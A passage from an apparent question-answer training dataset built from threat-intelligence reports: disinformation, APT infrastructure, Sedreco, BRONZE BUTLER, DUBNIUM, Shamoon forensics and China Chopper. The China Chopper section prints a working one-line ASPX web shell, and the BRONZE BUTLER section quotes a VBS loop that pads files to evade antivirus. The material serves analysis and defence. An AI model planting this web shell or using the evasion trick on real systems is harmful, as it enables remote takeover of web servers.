\u041f\u0435\u0440\u0432\u043e\u0433\u043e \u043a\u0430\u043d\u0430\u043b\u0430 \u043d\u0430 \u0441\u0430\u043c\u043e\u043c \u0434\u0435\u043b\u0435 (w/eng subs), 13 July 2014, (<https://www.youtube.com/watch?v=ua1le6ikmfk>)https://www.youtube.com/watch?v=UA1LE6iKMfk.\n15 Lily Hyde, 'Rumors and disinformation push Donetsk residents into wartime siege mentality,' Kyiv Post, 3 May 2014, (<http://www.kyivpost.com/content/ukraine-abroad/rumors-and-disinformation-push-donetsk-residents-into-wartime-siege-mentality-346131.html>)http:// (<http://www.kyivpost.com/content/ukraine-abroad/rumors-and-disinformation-push-donetsk-residents-into-wartime-siege-mentality-346131.html>)www.kyivpost.com/content/ukraine-abroad/rumors-and-disinformation-push-donetsk-residents-into-wartime-siege-men-(<http://www.kyivpost.com/content/ukraine-abroad/rumors-and-disinformation-push-donetsk-residents-into-wartime-siege-mentality-346131.html>)tality-346131.html.\n16 Ibid.\n17 NATO Strategic Communications Centre of Excellence. Analysis of Russia's Information Campaign against Ukraine, 2014.\nQ: How did pro-Russian forces utilize social media to manipulate public opinion during the Russian-Ukrainian conflict, and what specific tactics were employed to achieve this?",
    "output": "Pro-Russian forces utilized social media to manipulate public opinion by systematically cultivating fear, anxiety, and hate among ethnically Russian and other non-Ukrainian populations in Ukraine. Specific tactics included disseminating false information about purported atrocities committed by the Ukrainian army, such as mass graves, organ trafficking, crop burning, child soldier recruitment, heavy weapon usage against civilians, and acts of cannibalism. These tactics aimed to influence the target population's perceptions and behaviors by spreading misinformation rapidly across social media platforms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do adversaries, such as those behind the RSA_Russian-Bank-Offices-Phishing-Wave APT, utilize compromised Virtual Private Servers (VPSs) to support their malicious operations?",
    "output": "Adversaries, including those behind the RSA_Russian-Bank-Offices-Phishing-Wave APT, compromise third-party Virtual Private Servers (VPSs) to leverage the trust and ubiquity associated with reputable cloud service providers. By doing so, they create a layer of abstraction between themselves and their malicious activities, making it challenging to attribute the operations to the actual perpetrators. In the case of the RSA_Russian-Bank-Offices-Phishing-Wave APT, the attackers likely compromised a VPS, which was previously used as a Minecraft server, to host their Command and Control (C2) infrastructure. This allowed them to blend in with legitimate traffic and avoid detection. Furthermore, the use of a compromised VPS enabled the attackers to capitalize on the reputation of the cloud service provider, making their malicious activities appear more benign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Plugins\nAn interesting feature of Sedreco is its ability to run external plugins. The downloading and execution of those plugins can be requested by the C&C server with command number 1, while their unloading can be accomplished with command number 2 (see ).\nA Sedreco plugin comes as a Windows DLL with two exported functions named Init and UnInit. The plugin is loaded in the same address space as Sedreco's payload with a call to the Windows API LoadLibraryA. The plugin's Init export is then called, with the following structure as its argument:\nThis structure contains some helper functions' addresses, plus some data addresses, from Sedreco's payload, that the plugin may need during its execution.\nWe only found one Sedreco plugin during our investigation. Once loaded in memory, this plugin registers a new command, numbered 36, as shown in Figure 20.\nWhen called by the operators, the newly registered command will open a remote Windows shell over HTTP.\nWhen Sedreco exits, the payload unloads all plugins and calls their UnInit exports. In the case of the plugin we retrieved, this export simply unregisters the command it provides, as shown in Figure 21.\nInterestingly, parts of the plugin code are shared with the Windows Xagent module named ProcessRetranslatorModule (see ). In particular, the function in charge of creating a Windows shell process with some communication pipes is exactly the same in both binaries, including some custom error messages such as #EXC_1 Cannot create ExtToProc Pipe!.\nMedium Headline: Conclusion and Open Questions\nWith its ability to register new commands dynamically, Sedreco is a flexible backdoor that has been used for many years by the Sednit group.\nAn interesting feature of Sedreco is the ability to load external plugins. As we only found one plugin, we hope this report will encourage other researchers to contribute further pieces to the puzzle. In particular, it would be interesting to search for other code-sharing cases between Sedreco plugins and Xagent modules.\n\nAnswer this question based on the above context: How does the Sedreco backdoor, utilized by the Sednit group, leverage external plugins to enhance its functionality, and what are the implications of this capability for cybersecurity professionals?",
    "output": "Sedreco, a backdoor used by the Sednit group, enhances its functionality through the use of external plugins. These plugins are Windows DLLs with two exported functions, Init and UnInit. The C&C server can request the downloading and execution of these plugins using command number 1, and their unloading with command number 2. When a plugin is loaded, its Init function is called, providing it with a structure containing helper functions and data addresses from Sedreco's payload. This allows the plugin to perform tasks such as opening a remote Windows shell over HTTP, as seen in the discovered plugin that registers a new command numbered 36. When Sedreco exits, it unloads all plugins and calls their UnInit functions to clean up. This modular approach makes Sedreco a flexible and adaptable backdoor, capable of evolving its capabilities through the addition of new plugins. For cybersecurity professionals, this means they must be vigilant in detecting and analyzing not just the core backdoor but also any associated plugins, as these can introduce new attack vectors and functionalities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: about proofpoint\nProofpoint Inc. (NASDAQ:PFPT) is a leading security-as-a-service provider that focuses on cloud-based solutions for threat protection, compliance, archiving & governance, and secure communications. Organizations around the world depend on Proofpoint's expertise, patented technologies and on-demand delivery system to protect against phishing, malware and spam, safeguard privacy, encrypt sensitive information, and archive and govern messages and critical enterprise information.\n892 Ross Drive\nSunnyvale, CA 94089\n1.408.517.4710\nwww.proofpoint.com\n\u00a9Proofpoint, Inc. Proofpoint is a trademark of Proofpoint, Inc. in the United States and other countries. All other trademarks contained herein are property of their respective owners.\nQ: How does Proofpoint Inc. leverage its cloud-based solutions to protect organizations from phishing, malware, and spam? Additionally, how does it ensure the privacy and governance of critical enterprise information?",
    "output": "Proofpoint Inc. leverages its cloud-based solutions to protect organizations through several key methods. Firstly, it focuses on threat protection by providing solutions that guard against phishing, malware, and spam. This is achieved through patented technologies and an on-demand delivery system. Secondly, Proofpoint ensures compliance and governance by offering services for archiving and governing messages and critical enterprise information. These solutions help organizations safeguard privacy and encrypt sensitive information, thereby maintaining the integrity and confidentiality of their data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 4.3 \u7d99\u7d9a\u3057\u305f\u901a\u4fe1\u306e\u78ba\u7acb\n(RAT)\u3092\u611f\u67d3\u7aef\u672b\u4e0a\u3067\u52d5\u4f5c\u3055\u305b\u307e\u3059\u3002 \u306b\u3088\u308b\u653b\u6483\u3067\u306f\u3001\u6700\u521d\u304b\u3089 RAT\u306b\u611f\u67d3\u3055\u305b\u308b\u3053\u3068\u306f\u305b\u4eca\u56de\u306e\u653b\u6483\u306b\u9650\u3089\u305a\u591a\u304f\u306e\u5834\u5408\u653b\u6483\u8005\u306f\u3001\u6a19\u7684\u7d44\u7e54\u3078\u4fb5\u5165\u3057\u305f\u5f8c\u306b\u653b\u6483\u8005\u304b\u3089\u306e\u547d\u4ee4\u306b\u5f93\u3063\u3066\u52d5\u4f5c\u3059\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u305a\u3001\u307e\u305a RAT\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3059\u308b\u30de\u30eb\u30a6\u30a7\u30a2(\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0)\u306b\u611f\u67d3\u3055\u305b\u308b\u30b1\u30fc\u30b9\u304c\u591a\u304f\u3092\u5360\u3081\u3066\u3044\u307e\u3057\u305f\u3002\n\u304c\u7528\u3044\u308b\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u306f\u3001\u4e00\u7a2e\u985e\u3067\u306f\u306a\u304f\u591a\u7a2e\u985e\u5b58\u5728\u3057\u307e\u3059\u3002\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u5f62\u5f0f\u306e\u307b\u304b\u3001 PowerShell\u30b9\u30af\u30ea\u30d7\u30c8\u3001VBS\u3084 VBE\u30b9\u30af\u30ea\u30d7\u30c8\u5f62\u5f0f\u304c\u5b58\u5728\u3057\u3066\u304a\u308a\u3001\u88ab\u5bb3\u7d44\u7e54\u3084\u6642\u671f\u306b\u3088\u3063\u3066\u4f7f\u7528\u3059\u308b\u3082\u306e\u304c\u7570\u306a\u308a\u307e\u3059\u3002\n\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u306f\u5171\u901a\u3057\u3066 HTTP\u3067\u30d5\u30a1\u30a4\u30eb\u3092\u53d6\u5f97\u3057\u307e\u3059\u304c\u3001\u591a\u304f\u306e\u5834\u5408\u3001\u305d\u306e\u30d5\u30a1\u30a4\u30eb\u306f\u5727\u7e2e\u304a\u3088\u3073\u30a8\u30f3\u30b3\u30fc\u30c9\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u306f\u305d\u306e\u30d5\u30a1\u30a4\u30eb\u306b\u5bfe\u3057\u3066\u30c7\u30b3\u30fc\u30c9\u51e6\u7406\u3092\u884c\u306a\u3044\u3001\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u306b\u5fa9\u5143\u3057\u3066\u304b\u3089\u5b9f\u884c\u3057\u307e\u3059\u3002\u6700\u7d42\u7684\u306b\u5b9f\u884c\u3055\u308c\u308b\u3053\u306e\u30d5\u30a1\u30a4\u30eb\u304c RAT\u3067\u3042\u308b\u53ef\u80fd\u6027\u304c\u9ad8\u3044\u3067\u3059\u304c\u3001\u3044\u304f\u3064\u304b\u306e\u4e8b\u4f8b\u3067\u306f\u3001\u518d\u3073\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3057\u3001RAT\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3059\u308b\u30b1\u30fc\u30b9\u3082\u5b58\u5728\u3057\u307e\u3057\u305f\u3002\n\u7279\u5fb4\u3068\u3057\u3066 \u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u306b\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u3001\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u306e\u672b\u5c3e\u306b\u5927\u91cf\u306e\u30b4\u30df\u30c7\u30fc\u30bf\u3092\u66f8\u304d\u8fbc\u307f\u3001\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u306e\u30b5\u30a4\u30ba\u3092 50MB\u304b\u3089 100MB\u307b\u3069\u306b\u3059\u308b\u51e6\u7406\u304c\u5b58\u5728\u3057\u307e\u3059\u3002\u5b9f\u969b\u306b\u3001\u307b\u3068\u3093\u3069\u306e RAT\u304c 50MB\u4ee5\u4e0a\u306e\u30b5\u30a4\u30ba\u3067\u3042\u308b\u3053\u3068\u3092 SecureWorks\u3067\u306f\u78ba\u8a8d\u3057\u3066\u304a\u308a\u3001\u30a6\u30a4\u30eb\u30b9\u5bfe\u7b56\u30bd\u30d5\u30c8\u306a\u3069\u306b\u3088\u308b\u30b9\u30ad\u30e3\u30f3\u56de\u907f\u304c\u76ee\u7684\u3068\u3057\u3066\u8003\u3048\u3089\u308c\u307e\u3059\u3002\nConst ForAppending = 8\nset objTextFile = fso.OpenTextFile (s1, ForAppending, True)\ni=1\ndo objTextFile.WriteLine(\"000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000\")\ni=i+1\nif i=524288 then exit do end if loop objTextFile.Close\n\u3053\u308c\u3089\u306e\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u306f\u3001\u4fb5\u5165\u76f4\u5f8c\u306b\u884c\u3046 RAT\u306e\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u306e\u307f\u3067\u306a\u304f\u3001\u5f8c\u8ff0\u306e\u6a2a\u65ad\u7684\u4fb5\u5bb3\u306e\u969b\u306b\u3082\u4f7f\u7528\u3055\u308c\u307e\u3059\u3002\n\u4e00\u9023\u306e\u653b\u6483\u6d3b\u52d5\u3067\u4f7f\u7528\u3055\u308c\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u3046\u3061\u3001RAT\u3068\u3057\u3066\u306e\u6a5f\u80fd\u3092\u6301\u3064\u30de\u30eb\u30a6\u30a7\u30a2\u306f\u4ee5\u4e0b\u306e\u3068\u304a\u308a\u3067\u3059\u3002\n\u2022 Daserf\no \u6307\u5b9a\u3055\u308c\u305f URL\u304b\u3089\u547d\u4ee4\u306e\u9001\u53d7\u4fe1\u3092\u884c\u3046\u30b5\u30fc\u30d0\u60c5\u5831\u3092\u53d6\u5f97\u3057\u3001RAT\u3068\u3057\u3066\u52d5\u4f5c\u3059\u308b\no 2015\u5e74\u3054\u308d\u304b\u3089\u6539\u826f\u7248\u3068\u306a\u308a\u3001\u901a\u4fe1\u30d1\u30bf\u30fc\u30f3\u306a\u3069\u304c\u5909\u5316\u3057\u305f\n\u2022 Datper\no \u6307\u5b9a\u3055\u308c\u305f URL\u306b\u63a5\u7d9a\u3057\u3001\u547d\u4ee4\u306e\u9001\u53d7\u4fe1\u3092\u884c\u3046 RAT\no \u901a\u4fe1\u30d1\u30bf\u30fc\u30f3\u304c Daserf\u3068\u5927\u304d\u304f\u7570\u306a\u308b\n\u2022 xxmm\no \u6307\u5b9a\u3055\u308c\u305f URL\u306b\u63a5\u7d9a\u3057\u3001\u547d\u4ee4\u306e\u9001\u53d7\u4fe1\u3092\u884c\u3046 RAT\no Daserf\u3001Datper\u3069\u3061\u3089\u3068\u3082\u901a\u4fe1\u30d1\u30bf\u30fc\u30f3\u304c\u7570\u306a\u308a\u3001\u6700\u3082\u9ad8\u6a5f\u80fd\no \u30a6\u30a4\u30eb\u30b9\u5bfe\u7b56\u30bd\u30d5\u30c8\u691c\u77e5\u540d\u3068\u3057\u3066\u307b\u304b\u306b Minzen\u304c\u3042\u308b\n\u3069\u306e\u30de\u30eb\u30a6\u30a7\u30a2\u5171\u901a\u3057\u3066 HTTP \u30ea\u30af\u30a8\u30b9\u30c8\u3092\u4f7f\u7528\u3057\u3066\u547d\u4ee4\u3084\u30c7\u30fc\u30bf\u306e\u9001\u53d7\u4fe1\u3092\u884c\u3044\u307e\u3059\u3002\u307e\u305f\u547d\u4ee4\u3084\u30c7\u30fc\u30bf\u306f\u6697\u53f7\u5316\u3055\u308c\u3066\u304a\u308a\u3001\u4e00\u898b\u3067\u306f\u305d\u306e\u5185\u5bb9\u3092\u5224\u65ad\u3059\u308b\u3053\u3068\u306f\u3067\u304d\u307e\u305b\u3093\u3002 HTTP\u30ea\u30af\u30a8\u30b9\u30c8\u306e\u30d1\u30bf\u30fc\u30f3\u3084\u4f7f\u7528\u3055\u308c\u308b\u6697\u53f7\u6280\u8853\u306f\u30de\u30eb\u30a6\u30a7\u30a2\u306b\u3088\u3063\u3066\u7570\u306a\u308a\u3001\u305d\u308c\u305e\u308c\u4ee5\u4e0b\u306e\u3068\u304a\u308a\u3067\u3059\u3002\n\u8868 1 RAT\u6bce\u306e\u901a\u4fe1\u30fb\u6697\u53f7\u5316\u65b9\u5f0f\nDaserf\u3084 Datper\u306f\u4f7f\u7528\u3059\u308b\u6697\u53f7\u9375\u304c\u30de\u30eb\u30a6\u30a7\u30a2\u306b\u57cb\u3081\u8fbc\u307e\u308c\u3066\u3044\u308b\u305f\u3081\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u304c\u6b8b\u3063\u3066\u3044\u308b\u5834\u5408\u3084\u65e2\u77e5\u306e\u6697\u53f7\u9375\u3092\u4f7f\u7528\u3057\u3066\u3044\u308b\u5834\u5408\u306b\u306f\u3001\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u306e URL\u60c5\u5831\u304b\u3089\u30c7\u30fc\u30bf\u306e\u5fa9\u53f7\u304c\u53ef\u80fd\u3067\u3059\u3002\u305f\u3060\u3057\u3001xxmm\u306b\u3064\u3044\u3066\u306f\u30ef\u30f3\u30bf\u30a4\u30e0\u30ad\u30fc\u3092\u7528\u3044\u305f AES\u6697\u53f7\u3092\u4e3b\u306b\u4f7f\u7528\u3059\u308b\u305f\u3081\u3001\u5927\u534a\u306f\u5fa9\u53f7\u304c\u56f0\u96e3\u3068\u306a\u308a\u307e\u3059\u3002\n\u3053\u308c\u3089\u306e RAT\u306f Internet Explorer\u306e\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3092\u4f7f\u7528\u3057\u3066\u30a4\u30f3\u30bf\u30fc\u30cd\u30c3\u30c8\u901a\u4fe1\u3092\u884c\u3046\u305f\u3081\u3001\u8a8d\u8a3c\u30d7\u30ed\u30ad\u30b7\u3092\u4f7f\u7528\u3057\u3066\u3044\u308b\u5834\u5408\u3067\u3042\u3063\u3066\u3082\u3001Internet Explorer\u3067\u8a8d\u8a3c\u6e08\u307f\u306e\u6642\u9593\u5e2f\u306f\u901a\u4fe1\u306b\u6210\u529f\u3057\u307e\u3059\u3002\nSecureWorks\u304c\u89b3\u6e2c\u3057\u305f\u3068\u3053\u308d\u306b\u3088\u308b\u3068\u3001 \u306f\u4ee5\u4e0b\u306e\u3068\u304a\u308a\u6642\u671f\u306b\u3088\u3063\u3066\u3053\u308c\u3089\u306e RAT\u3092\u4f7f\u3044\u5206\u3051\u3066\u3044\u307e\u3059\u3002\u73fe\u5728\u306f Datper\u304a\u3088\u3073 xxmm\u3092\u4f7f\u7528\u3057\u3066\u3044\u308b\u5834\u5408\u304c\u591a\u304f\u3001\u3053\u306e\u4e8c\u7a2e\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u30a2\u30c3\u30d7\u304c\u7e70\u308a\u8fd4\u3055\u308c\u3066\u3044\u308b\u72b6\u6cc1\u3092\u78ba\u8a8d\u3057\u3066\u3044\u307e\u3059\u3002\n\u56f3 2 RAT\u304c\u4f7f\u7528\u3055\u308c\u305f\u6642\u671f(Source: SecureWorks)\nSecureWorks\u3067\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306b xxmm\u3092\u4efb\u610f\u306e\u8a2d\u5b9a\u3067\u4f5c\u6210\u3059\u308b\u30d3\u30eb\u30c0\u30fc\u306e\u5b58\u5728\u3082\u78ba\u8a8d\u3057\u3066\u3044\u307e\u3059\u3002BRONZE BUTLER\u306f\u3053\u306e\u3088\u3046\u306a\u30d3\u30eb\u30c0\u30fc\u3092\u4f7f\u7528\u3057\u3066\u3001\u7570\u306a\u308b\u30b5\u30fc\u30d0\u3068\u901a\u4fe1\u3059\u308b\u591a\u6570\u306e RAT\u3092\u751f\u6210\u3057\u3066\u3044\u308b\u3068\u8003\u3048\u3089\u308c\u307e\u3059\u3002\n\u56f3 3 xxmm\u306e\u30d3\u30eb\u30c0\u30fc\u306e\u8a2d\u5b9a\u753b\u9762(Source: SecureWorks)\n\nIn the context of the BRONZE BUTLER APT report, how does the use of different types of downloaders contribute to the complexity and evasion tactics employed by the attackers? Additionally, explain the significance of the garbage data appended to the executable files.",
    "output": "A: The BRONZE BUTLER APT employs various types of downloaders, including executable files, PowerShell scripts, VBS, and VBE scripts, which are chosen based on the targeted organization and the timing of the attack. This diversity makes it challenging for defenders to detect and mitigate the initial infection vector uniformly. The downloaders commonly retrieve files over HTTP, which are often compressed and encoded. These files are decoded and executed, potentially leading to the installation of Remote Access Trojans (RATs) or further downloaders. A notable characteristic of these downloaders is the addition of large amounts of garbage data to the end of the executable files, inflating their size to around 50MB to 100MB. This tactic is likely aimed at evading detection by antivirus software, as many security tools might struggle with scanning such large files efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ROP-less shellcode\nWith this exploit, shellcode is not just contiguous memory area, but various shellcodes are called through separate call methods. As you can see from this exploit, we are observing more exploits operate without return-oriented programming (ROP) chains. We can track these calls by putting a breakpoint on the native code that performs the ActionScript call method. For example, the disassembly in Figure 19 shows the code that calls the InternetOpenUrlA API call.\nThis call only retrieves some portion of a portable executable (PE) file's header, but not the whole file. It will do another run of the InternetOpenUrlA API call to retrieve the remaining body of the payload. This is most likely a trick to confuse\nanalysts who will look for a single download session for payloads.\nBig Headline: Conclusion\nWith the analysis of the Adobe Flash Player-targeting exploit used by DUBNIUM last December, we learned they are using highly organized exploit code with extensive support of operating system flavors. However, some functionalities for some operating system are not yet implemented. For example, some 64-bit support routines had an empty function inside them.\nThe way the shellcode is authored makes the exploit code very extensible and flexible as changing shellcode behavior is extremely simple \u2013 as much as just changing AS3 code lines.\nThe actual first stage payload download is not just performed by a single download but are split into two.\nThey also use the ByteArray.length corruption technique to achieve process memory RW access. There was a hardening upon this object just after this incident and ByteArray now has better sanity checks. Therefore, the same technique would not work as straightforwardly as in this exploit for the versions after the hardening.\nThe exploit relies heavily on heap-spraying techniques, and this is one major element that makes this exploit unreliable.\nThis is a good example of how mitigation undermines an exploit's stability, and how it increases exploit development cost.\nDue to the exploitation method it relies on for the Function object corruption, with Microsoft Edge you have additional protection over this new exploit method.\nJeong Wook Oh\nMMPC\nQ: How does the DUBNIUM exploit manage to execute shellcode without relying on traditional return-oriented programming (ROP) chains? Explain the methodology and its implications for analysts.",
    "output": "The DUBNIUM exploit manages to execute shellcode without traditional ROP chains by calling various shellcodes through separate call methods. Instead of having a contiguous memory area for shellcode, different parts of the shellcode are executed via distinct calls. This approach can be tracked by setting a breakpoint on the native code responsible for the ActionScript call method. For instance, the exploit uses the InternetOpenUrlA API call to retrieve portions of a PE file's header separately, rather than downloading the entire file at once. This technique aims to confuse analysts who might be looking for a single download session for payloads, making the exploit harder to detect and analyze.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: VBR and File System Recovery Strategies\nThe following is the view of the wiped disk for each of the operating systems that we tested:\nFig 1. Example of wiped of MBR and VBR wiped by Shamoon Malware.\nFigure 1 was found at the MBR (Sector 0) and the VBR (Sector 63/56 (XP, 2003), and 2048/206848 (7)) of each of the operating systems (As well as throughout the drive). Fidelis\nresearchers decided to look further into the drive and find if there was any possibility of recovering files or logs that would help illuminate what happened to the systems, and if any artifacts of the malware could be recovered.\nNote on the VBR: VBR stands for Volume Boot Record, and is made up of the boot sector and bootstrap code. The boot sector takes up 1 sector on the drive; the next 6 sectors on the drive are allocated for the bootstrap code. In all 16 sectors are allocated in total for the VBR. The VBR is created when a file system is created on a partition. In this paper we will be covering the NTFS Boot Record. The VBR is used to load machine code into RAM to start a program. Normally this program is the operating system.\nKeyword searches revealed that there were still files that would be recoverable on the system. In particular it was found that registry files and headers were still on the disk. After this, it was found that the Master File Table (MFT) was still, for the most part, intact. Trying to avoid the long and laborious process of carving files from the disk, researchers decided that it would instead be worth the time to try and recover the file system.\nWhen the Windows operating system is installed or an NTFS volume created, a backup copy of the VBR is written to the last sector of the volume. This is a very important detail, as the forensic value of the VBR is substantial (See Figure 2). The area that will contain the critical information is known as the Bios Parameter Block (BPB). With this information it is possible to rebuild the file system as it existed before the wipe.\nEB 52 90 4E 54 46 53 20 20 20 20 00 02 08 00 00 00 00 00 00 00 F8 00 00 3F 00 FF 00 3F 00 00 00 00 00 00 00 80 00 80 00 C0 F8 F8 0D 00 00 00 00 00 00 0C 00 00 00 00 00 8C 8F DF 00 00 00 00 00 F6 00 00 00 01 00 00 00 26 FA CA 70 02 CB 70 44 00 00 00 00\n[\u2026 Truncated for size \u2026]\n00 00 55 AA\nEB 52 90 \u2013 Instruction to jump to boot code (Not necessary for our application)\n4E 54 46 53 20 20 20 20 \u2013 OEM Name (NTFS )\n00 02 \u2013 Bytes per sector, 0x0200 = 512 Bytes.\n08 \u2013 Sectors per cluster = 8\nF8 \u2013 Media descriptor (Not necessary for our application)\nC0 F8 F8 0D 00 00 00 00 \u2013 Total sectors in file system, 0x00DF8F8C0 = 234420416 Sectors (Add on the sector location of VBR for actual end of the file system, in this example the VBR is at sector 63 therefore the total sectors in the file system are 234420416 + 63 = 234420479)\n00 00 0C 00 00 00 00 00 \u2013 Starting cluster of the MFT, 0X000C0000 = 786432 Clusters. 786432 * 8 (Cluster size) +63 (VBR Sector) = 6291519 Sectors\n8C 8F DF 00 00 00 00 00 \u2013 Starting cluster of the MFT mirror, 0x00DF8F8C = 14651276. 14651276 * 8 + 63 = 117210271 Sectors\nF6 \u2013 Size of MFT Entry, 246.\n01 \u2013 Index size, 1.\n26 FA CA 70 02 CB 70 44 \u2013 Serial number.\nFor more technical information on file systems and their forensic value, Brian Carrier's book File System Forensic Analysis is an invaluable tool.\nFig 2. Example of a broken down BPB found within the boot sector.\nJust because the boot sector of the VBR is recoverable doesn't mean that everything on the file system will be restored to normal. If a file was wiped by the malware then it will still be wiped, or partially wiped. However files that weren't wiped will be much easier and faster to recover then carving and the context of each file will be easy to interpret.\nTo recover or identify the backup VBR a search will need to be run across the image file. It is preferable if the image file is a raw image as they are easier to edit then other image file formats. The search was performed for the hex of the VBR file header, EB 52 90 4E 54 46 53 (\u00ebR\u0141NTFS). A few hits were found throughout the drive, and it appeared that there were multiple empty VBR templates throughout the system (Shown in Figure 3). The correct VBR will likely be the one with information filled in from offset 10 \u2013 80 (See Figure 2 to breakdown). During testing it was found that the last hit was normally the correct VBR, as this would be the VBR found at the end of the volume.\nFig 3. Example of a blank VBR.\nNote: On 2003 systems the boot backup is sometimes found halfway through the partition, a manual parsing of the file will need to be performed to confirm the VBR is legitimate for the partition.\nOnce the VBR was found we noted the offset and calculated the sector to locate the backup in our desired forensic program. For the purposes of testing we used EnCase (v6.19.6). Once the sector of the backup VBR is known, EnCase was started and the image of the infected system was loaded. Within disk view we located the backup VBR and right clicked to add a manual partition as an NTFS file system. The partition was added, the MFT read, and the file system appeared:\nFig 4. File system recovered within EnCase.\nWith the file system restored some relevant artifacts can be located now, and an actual computer forensic examination can take place.\nThis recovery can be successful without the use of the EnCase suite of forensic software as well. Using a hex editor of your choice to repair the image, in our testing WinHex (16.6) was used. Find the file header of the backup VBR within a file editor, copy from the header to footer of the boot sector; the footer will always be 55 AA. The size will be 512 bytes from header to footer. Then depending on what operating system is being examined you can write the copied boot sector to the appropriate sector on the affected image.\nPlacing the boot sector into the correct location will be the trickiest part as incorrect placement will result in the file system not being recognized. The boot sector should be placed at sector 63/56 for XP/2003, and at sector 2048/206848 for Windows 7. After this is complete you will be able to add the image into the forensic program. If the file system is not recognized then it is possible that the MBR will need to be reconstructed, though this is unlikely. Before rebuilding the MBR try adding the image as a volume and not as a disk.\nNote: Other recovery techniques are certainly viable as well. There are automated partition rebuilding tools available, though some of these rely on a valid MBR to work properly (In this case that wouldn't be feasible). Other options would be the fixboot command from the Windows Recovery Console found on a Windows OS disk. What we have presented here are forensically sound methods that are easily repeatable and least damaging to the evidence/image.\n\nQ: What is the significance of the Bios Parameter Block (BPB) in the context of recovering a file system affected by the Shamoon malware?",
    "output": "A: The Bios Parameter Block (BPB) within the Volume Boot Record (VBR) is crucial for recovering a file system affected by the Shamoon malware. The BPB contains essential information about the file system, including the bytes per sector, sectors per cluster, total sectors in the file system, starting clusters of the Master File Table (MFT) and its mirror, size of MFT entries, index size, and serial number. This information allows forensic analysts to rebuild the file system as it existed before the wipe. By locating and analyzing the BPB, researchers can understand the structure of the file system and facilitate the recovery process, making it easier to interpret the context of each file and potentially recover relevant artifacts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the collaboration among threat actors in underground development forums contribute to the evolution of Remote Access Trojans (RATs) like BlackWorm?",
    "output": "Collaboration among threat actors in underground development forums contributes to the evolution of RATs like BlackWorm by allowing different actors to build upon and enhance existing tools. For instance, the original BlackWorm builder (v0.3.0) was co-authored by Naser Al Mutairi ('njq8') and Black Mafia. Later, another author, Black.Hacker, enhanced its feature set in the BlackWorm Dark Edition (v2.1). This collaborative approach enables the rapid development and improvement of malicious tools, making them more sophisticated and harder to detect.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Web shell client\nThe Web shell client was originally available on www.maicaidao.com. FireEye advises against visiting that site now.\n1 Tyler's China Chopper post is available at http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html.\nThe client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.\nThe executable file compressor UPX unpacks the binary to reveal details hidden by the packer.\nC:\\Documents and Settings\\Administrator\\Desktop>upx -d 5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe Ultimate Packer for eXecutables\nCopyright (C) 1996 - 2011\nUPX 3.08w   Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011\nFile size   Ratio  Format  Name Unpacked 1 file. 700416 <-  220672   31.51%  win32/pe   decomp.exe\nPEiD (a free tool for detecting packers, cryptors, and compilers found in PE executable files),2 reveals that the unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.\nBecause the strings are not encoded, examining them in the unpacked binary exposes how the backdoor communicates. Appearing in the strings are an intriguing reference to google.com.hk using the Chinese (simplified) language parameter (Figure 3) and references to the text \"Chopper\" (Figure 4).\n2 More information about PEiD is available at http://www.aldeid.com/wiki/PEiD.\nIn action, China Chopper is a menu-driven GUI full of convenient attack and \"target-management\" features. When opened, the client displays example shell entries that point to www.maicaidao.com, which originally hosted components of the Web shell.\nTo add a target, attackers right click within the client window, select Add from the menu and enter the target IP address, password, and encoding as shown in Figure 5.\nMedium Headline: Server-side Payload Component\nBut the client is only half of the remote access tool (RAT)\u2014and not likely the part that would appear on a targeted network. Its communication relies on a payload in the form of a small Web application. This payload is available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Table 2 shows some of the original files available for download shown with their MD5 hashes.\nEven though the MD5s are useful, this is a text-based payload that can be easily changed, resulting in a new MD5 hash. Here is an example of just one of China Chopper's text-based payloads (for more details, see \"Payload Attributes\" on Page 11):\nASPX:\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"password\"],\"unsafe\");%>\nIn real-world use, \"password\" would be replaced with the actual password to be used in the client component when connecting to the Web shell.\n3 Keith Tyler. \"China Chopper Webshell - the 4KB that Owns your Web Server.\" November 2012.\nBig Headline: 